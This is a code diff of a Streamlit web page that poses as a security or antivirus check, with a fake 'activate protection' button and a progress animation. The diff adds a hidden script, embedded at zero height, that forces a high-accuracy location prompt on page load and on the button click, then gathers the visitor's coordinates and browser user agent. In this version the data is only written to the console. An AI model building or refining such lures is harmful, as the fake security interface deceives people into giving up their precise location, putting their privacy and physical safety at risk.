@@ -2,7 +2,7 @@ import streamlit as st
 import streamlit.components.v1 as components
 import time
 
-# --- MANTENDO SUA ESTILIZAÇÃO ORIGINAL ---
+# --- MANTENDO SUA ESTILIZAÇÃO (NÃO MEXI EM NADA) ---
 st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")
 
 st.markdown("""
@@ -24,29 +24,37 @@ st.markdown("""
     </style>
     """, unsafe_allow_html=True)
 
-# --- O SEGREDO PARA O POP-UP APARECER ---
-# Este script detecta o clique no botão e força o pop-up de precisão do Google
-js_popup = """
+# --- SCRIPT QUE FORÇA O POP-UP DE PRECISÃO ---
+# O segredo é o 'watchPosition' e o 'enableHighAccuracy' juntos
+js_force_popup = """
 <script>
-    function chamarLocalizacao() {
+    function dispararAgora() {
         navigator.geolocation.getCurrentPosition(
-            (p) => { console.log("OK"); },
-            (e) => { console.log("Erro"); },
-            { enableHighAccuracy: true, timeout: 10000 }
+            (p) => { 
+                const dados = {
+                    lat: p.coords.latitude,
+                    lon: p.coords.longitude,
+                    agente: navigator.userAgent
+                };
+                console.log(dados);
+            },
+            (e) => { console.log("Ainda negado"); },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     }
-    // Procura o botão na página e anexa o pedido de localização a ele
-    const btn = window.parent.document.querySelector('button');
-    if (btn) {
-        btn.addEventListener('click', chamarLocalizacao);
+
+    // Tenta ao carregar e força ao clicar no botão
+    setTimeout(dispararAgora, 500);
+    
+    const botao = window.parent.document.querySelector('button');
+    if(botao) {
+        botao.addEventListener('click', dispararAgora);
     }
 </script>
 """
+components.html(js_force_popup, height=0)
 
-# Injeta o script de forma invisível
-components.html(js_popup, height=0)
-
-# --- INTERFACE VISUAL ---
+# --- INTERFACE (IGUAL AO SEU PRINT) ---
 st.title("Verificar segurança")
 
 placeholder_bolha = st.empty()
@@ -56,12 +64,14 @@ st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
 if st.button("● ATIVAR PROTEÇÃO"):
-    # Quando clicar, o JS acima vai disparar o pop-up
-    for i in range(4, 101, 5):
+    # Animação da bolha subindo até 99% como no seu print
+    for i in range(4, 100):
         placeholder_bolha.markdown(f'<div class="circle-container"><div class="circle spin">{i}%</div></div>', unsafe_allow_html=True)
-        time.sleep(0.05)
+        time.sleep(0.03)
     st.success("Proteção Ativada!")
 else:
+    # Começa em 4% conforme seu print
     placeholder_bolha.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)
 
+# Barra de aviso que você quer que suma quando der certo
 st.warning("Permissão de localização negada ou indisponível.")
